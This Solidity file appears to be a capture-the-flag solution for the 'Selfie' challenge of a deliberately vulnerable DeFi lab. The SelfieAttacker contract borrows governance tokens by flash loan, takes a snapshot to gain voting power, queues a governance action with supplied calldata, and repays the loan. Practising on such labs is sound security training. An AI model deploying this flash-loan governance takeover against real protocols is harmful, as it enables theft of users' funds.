// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";


contract SelfieAttacker {
    using Address for address;

    address public governanceAddr;
    address public poolAddr;

    uint256 public actionId;


    SimpleGovernance public governance;
    SelfiePool public pool;
    bytes private data;

    constructor(address _governance, address _pool, bytes memory _data){
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        data = _data; 
        poolAddr = _pool;
    }

    function attack(uint256 amount, address _token) public {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
        uint256 balanceBefore = token.balanceOf(poolAddr);
        require(balanceBefore == amount, "Not enough tokens in pool");

        pool.flashLoan(amount);
    }

    function receiveTokens(address _token, uint256 amount) public {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);
        token.snapshot();
        actionId = governance.queueAction(poolAddr, data, 0);
        
        token.transfer(poolAddr, amount);
    }
}